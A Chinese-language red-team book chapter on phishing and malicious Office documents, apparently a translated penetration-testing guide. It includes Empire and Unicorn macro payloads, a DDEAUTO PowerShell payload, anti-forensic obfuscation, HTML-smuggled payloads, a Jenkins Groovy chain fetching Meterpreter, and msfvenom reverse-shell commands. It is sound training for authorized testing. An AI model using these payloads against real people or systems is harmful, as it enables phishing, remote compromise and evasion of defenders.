欺诈性购买的虚假电子邮件。
有人入侵了您的电子邮件。
有关税务欺诈的电子邮件。
对于这些一般性攻击，我们注意到公司员工变得越来越聪明。通常采用基本的网络钓鱼攻击，每10封电子邮件中至少有1封邮件被上报。在某些情况下数量要更多。持续监控这些简单的网络钓鱼攻击，确保公司是否能够更好地应对这些情况，对于红队来说是非常有价值的。
对于那些寻求更多自动化攻击的人来说，可能更愿意选择Gophish，因为它很容易设置和维护，支持模板和HTML，并跟踪/记录您需要的一切。如果您是Ruby的爱好者，那么有Phishing Frenzy；对于Python，有King Phisher。
这些自动化工具非常适合记录简单的网络钓鱼行为。对于目标开展行动，我们更多地采用手动的方法。例如，如果我们通过侦察，获得被攻击者的邮件记录，确认客户使用Office 365，那么我们就需要弄清楚，如何使用该信息构建一个非常逼真的行动。此外，我们会尝试查找该公司泄露的任何电子邮件、可能正在运行的程序、新功能、系统升级、合并以及有用的任何其他信息。
有时我们还会开展更有针对性的行动。在这些行动中，我们尝试使用所有开源工具来搜索有关人员、资产、家庭等相关的信息。例如，如果针对高管，我们会在pipl.com上搜索他们的资料，并伪造一封来自学校的电子邮件，告诉他们需要打开这个Word文档。这些操作可能会花费相当长的时间，但成功率却很高。
5.2.1 Microsoft Word/Excel宏文件
一种较早出现但经过实践检验的社会工程方法是向被攻击者发送恶意的Microsoft Office文件。为什么Office文件非常适合恶意静荷？因为在默认情况下，Office文件支持Visual Basic for Applications（VBA），允许代码执行。尽管最近这种方法已经很容易被杀毒软件检测到，但使用混淆方法后，在许多情况下仍然非常有效。
通常，我们可以使用Empire或Unicorn创建VBA宏。
（1）使用Empire。
选择Macro Stager。 
usestager windows/macro
确保进行正确的设置。 
info
创建宏。 
generate
（2）如果您想为Meterpreter创建静荷，那么可以使用像Unicorn这样的工具。
cd/opt/unicorn。
./unicorn.py windows/meterpreter/reverse_https [your_ip] 443 macro。
启动Metasploit监听程序。 
msfconsole-r./unicorn.rc
载荷生成后如图5.2所示。
图5.2
如您所见，上面示例中运行的是一个简单的PowerShell base64混淆脚本。这可以绕过一些杀毒软件产品，重要的是，确保在进行实际的行动之前，对其进行测试。在生成宏后，您可以快速创建一个Excel文档，如图5.3所示。
图5.3
打开Excel。
转到“视图”选项卡→“宏”→“查看宏”。
添加宏名称，为book1配置宏，然后单击“创建”按钮。
用生成的代码替换所有当前的宏代码，如图5.4所示。
另存为.xls（Word 97—Word 2003）格式或Excel宏启用。
图5.4
现在，当用户打开您的文档时，他们都会收到安全警告和启用内容的按钮，如图5.5所示。如果您可以欺骗被攻击者单击“Enable Content”（启用内容）按钮，PowerShell脚本将会执行，从而获得Empire Shell。
图5.5
如前所述，由于Macro方法是一种出现很久的攻击方法，因此许多被攻击者可能已经开始提防这种攻击。我们可以使用Office文件的另一个攻击方法，将静荷嵌入批处理文件（.bat）。在较新版本的Office中，如果被攻击者双击Word文档中的.bat文件，则不会执行对象。我们通常要“欺骗”他们，将.bat文件移动到桌面并执行，如图5.6所示。
图5.6
我们可以使用LuckyStrike以更自动化的方式完成此操作。使用LuckyStrike，我们可以在工作表中使用静荷创建Excel文档，甚至可以在Excel文档中存储完整的可执行文件（EXE），EXE文件可以使用ReflectivePE在内存中运行。
我介绍的Office文件可执行文件的最后一个工具是VBad。在运行VBad时，必须在Office中启用宏，并在宏安全设置中选中“信任对VBA项目对象模型的访问”复选框。这允许VBad Python代码更改并创建宏。
VBad对MS Office文档中的静荷做了深层次的混淆处理，如图5.7所示。VBad还增加了加密功能，采用假密钥方式迷惑了应急响应团队，最重要的是，它可以在第一次成功运行后破坏加密密钥（一次性恶意软件）。VBad的另一个特性是还可以删除静荷模块的引用，这样VBA 开发工具无法查看静荷，这使得分析和调试变得更加困难。因此，不仅逆向分析很难完成，而且如果应急响应团队尝试分析执行的Word文档与原始文档，那么所有密钥都将丢失。
图5.7
5.2.2 非宏Office文件——DDE
红队攻击的一个特点是，有时候时间点非常重要。在我们的一次评估中，首次发现了一个名为DDE的全新漏洞。任何杀毒软件或安全产品尚未检测到它，因此这是我们获得初始入口点的“好”方法。虽然现在有几种安全产品可以检测DDE，但在某些环境中它仍然可能是一种可行的攻击方式。
什么是DDE
Windows提供了几种在应用程序之间传输数据的方法，其中一种方法是使用动态数据交换（DDE）协议。DDE协议定义消息的格式和规则。DDE协议在共享数据的应用程序之间发送消息，并使用共享内存交换应用程序之间的数据。应用程序可以使用DDE协议进行一次性数据传输和持续的数据传输。
Sensepost团队做了一些研究，发现MS Excel和MS Word公开DDE执行接口，无须使用宏，可以执行代码，如图5.8所示。
图5.8
在Word中执行以下操作。
选择“插入”选项卡→“快速部分”→“字段”。
选择“公式”。
右键单击：！意外的公式结束并选择切换域代码。
将静荷更改为您的静荷。 
DDEAUTO c:\windows\system32\cmd.exe "/k powershell.exe [empire payload here]"
Empire有一个stager，它将自动创建Word文件和关联的PowerShell脚本，如图5.9所示。这个stager可以通过以下方式配置。
图5.9
usestager windows / macroless_msword。
有一种攻击会导致被攻击者向互联网上的攻击者服务器发出SMB请求，从而可以搜集被攻击者的NTLM鉴权散列值。这可能有效，也可能无效，因为现在大多数公司阻止SMB相关端口外联。对于那些无效的被攻击者，我们可以利用错误配置，实施subdoc_inector攻击。
5.2.3 隐藏的加密静荷
作为红队，我们一直在寻找创造性方法，构建目标网页，加密静荷，并诱使用户单击运行。两个具有类似处理流程的不同工具是EmbededInHTML和demiguise。
第一个工具EmbededInHTML首先获取文件（任何类型的文件），加密文件，并将其作为资源嵌入HTML文件中，以及自动下载程序（用于响应用户单击嵌入资源），然后，当用户浏览HTML文件时，嵌入式文件即时解密，保存在临时文件夹中，接着将文件呈现给用户，就像从远程站点下载一样，这具体取决于用户的浏览器和显示的文件类型，该文件可以由浏览器自动打开，如图5.10所示。
cd /op/EmbedInHTML。
python embedInHTML.py -k keypasshere -f meterpreter.xll –o index.html –w。
一旦被攻击者访问恶意站点，弹出窗口就会提示被攻击者Excel正打开.xll文件。注意，对于最新版本的Excel（除非配置错误），用户需要启用加载项来执行静荷。此时是您的社会工程技巧发挥作用的时候了。
图5.10
第二个工具demiguise生成包含加密的HTA文件的.html文件。思路是当被攻击者访问页面时，页面获取密钥，在浏览器中动态解密HTA，并直接呈现给用户。这是一种规避检测技术，绕过某些安全设备的内容/文件类型检查的方法。这个工具不是为了创建出色的HTA内容而设计的，还有其他工具/技术可以帮助您完成此操作。这个工具的用途在于帮助HTA首先进入一个环境，避免被沙箱分析（如果您使用环境密钥）。
python demiguise.py -k hello –c "cmd.exe/c " - p Outlook. Application -o test.hta。
5.3 内部Jenkins漏洞和社会工程攻击结合
作为红队，攻击的创造性总是令我们非常兴奋。我们喜欢利用旧的漏洞并再次使它们“焕然一新”。例如，如果您一直在执行网络评估，就会知道，如果遇到无须身份验证的Jenkins应用程序（开发人员大量使用它进行持续集成），这几乎意味着完全突破。
这是因为它具有允许Groovy脚本执行测试的“特性”。利用这个脚本控制台，我们可以使用Shell执行命令，访问底层系统，如图5.11所示。
这种方法在突破方面变得如此受“欢迎”的原因是，几乎每家大公司都有使用Jenkins案例。外部攻击的问题是这些Jenkins服务都是内部托管的，无法从外部访问。
图5.11
我们如何远程执行这些服务器上的代码？在回答这个问题之前，我告诉团队退后一步，用Jenkins构建一个仿真网络进行测试。一旦我们很好地理解了代码执行请求的功能，就可以构建适当的工具，实现远程执行代码。
在测试环境中，我们通过使用JavaScript和WebRTC（网站实时通信）的多个步骤解决了这个问题。首先，一个组织的被攻击者，访问公共网站（攻击者控制）或存储XSS静荷的页面。被攻击者访问公共网站，攻击者将在其浏览器上执行JavaScript，运行恶意静荷。静荷会利用Chrome/Firefox“功能”，允许WebRTC公开被攻击者的内部IP。通过内部IP，我们可以推断被攻击者主机的本地子网，了解其公司的IP范围。现在，攻击者可以使用定制的Jenkins攻击程序，通过默认端口8080扫描网络范围内的每个IP地址（代码只扫描本地“/24”子网，但在真实的行动中，扫描范围要大得多）。
接下来的问题是，我们使用什么静荷？如果使用过Jenkins控制台Shell，就会知道漏洞对于静荷比较“挑剔”。使用复杂的PowerShell静荷可能会很困难。为了解决这个问题，我们在本书中创建了一个名为“generateJenkinsExploit.py”的工具，该工具加密二进制文件，构建恶意攻击JavaScript页面。当被攻击者访问恶意网页时，它获取其内部IP地址，并开始将漏洞利用工具发送到“/24”范围内的所有服务器。当找到存在漏洞的Jenkins服务器时，首先运行一个Groovy脚本静荷，从互联网上获取加密的二进制文件，将其解密到C:\Users\Public\RT.exe目录中，执行Meterpreter二进制文件（RT.exe）。
从理论上来讲，这与服务器端请求伪造（SSRF）非常相似，我们强迫被攻击者的浏览器重新启动内部IP的连接，如图5.12所示。
图5.12
被攻击者访问存储XSS或恶意JavaScript页面。
被攻击者的浏览器执行JavaScript / WebRTC，获取内部IP，使用Groovy POST静荷，扫描本地内部网络。
在找到存在漏洞的Jenkins服务器后，Groovy代码通知Jenkins服务器，从攻击者的服务器获取加密的静荷，然后解密并执行二进制文件。
在这种情况下，下载的加密可执行文件是Meterpreter静荷。
在Jenkins服务器上执行Meterpreter，然后连接到攻击者的Meterpreter服务器。
注意：
最新版本的Jenkins中已不存在此漏洞。Jenkins 2.x之前的版本未启用CSRF保护（允许盲调用脚本）以及身份验证机制，在默认情况下是存在漏洞的。
完整的Jenkins漏洞实验室如下。
我们将构建一个Jenkins Windows服务器，用于重复开展攻击测试。
在本地网络上安装具有桥接接口的Windows虚拟机。
在Windows系统中，下载并安装Java的JDK 8。
下载Jenkins War文件。 
http://nurrors.jenkims.io/war-stable/1.651.2/
启动Jenkins。 
java -jar jenkins.war
浏览Jenkins。 
http://:8080/
测试Groovy脚本控制台。 
http://:8080/script
在THP Kali 虚拟机上对Jenkins实施漏洞攻击，如图5.13所示。
图5.13
下载THP Jenkins漏洞利用工具（http://bit.ly/2IUG8cs）。
进行实验，首先创建Meterpreter静荷。 
msfvenom -p windows/meterpreter/reverse_https LHOST =  LPORT = 8080 -f exe> badware.exe